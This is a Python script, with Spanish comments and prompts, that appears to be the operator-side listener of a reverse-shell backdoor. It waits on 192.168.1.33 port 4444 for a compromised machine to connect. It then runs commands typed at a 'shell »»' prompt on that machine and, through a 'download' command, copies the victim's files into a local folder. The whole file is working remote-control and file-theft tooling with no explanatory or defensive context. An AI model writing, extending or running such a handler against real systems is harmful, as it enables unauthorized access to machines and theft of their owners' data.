#!/usr/bin/env python3
import socket, os

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Esperando Conexiones")
        self.connection, address = listener.accept()
        print("[+] Tenemos una conexion de " + str(address))
        
        conexion = self.connection.recv(1024)
        print(conexion.decode('utf-8', errors='ignore'))
        
        # ← CREAR CARPETA DESCARGADOS
        if not os.path.exists("descargados"):
            os.makedirs("descargados")
        
    def ejecutarRemoto(self, command):
        self.connection.send(command.encode('utf-8'))
        return self.connection.recv(1024000)
    
    def run(self):
        while True:
            command = input("shell »» ")
            
            if command == "salir":
                self.ejecutarRemoto(command)
                self.connection.close()
                exit()
            
            # ← NUEVO: DOWNLOAD (RECIBIR ARCHIVO)
            elif command.startswith("download "):
                self.connection.send(command.encode('utf-8'))
                
                header = self.connection.recv(1024)
                print(header.decode('utf-8', errors='ignore'))
                
                contenido = self.connection.recv(1024000)
                
                nombre_archivo = command.split(" ")[1].split("\\")[-1]
                ruta_guardado = f"descargados/{nombre_archivo}"
                
                with open(ruta_guardado, 'wb') as f:
                    f.write(contenido)
                
                print(f"[+] Archivo guardado en: {ruta_guardado}")
                continue
            
            else:
                result = self.ejecutarRemoto(command)
                print(result.decode('utf-8', errors='ignore'))

escuchar = Listener("192.168.1.33", 4444)
escuchar.run()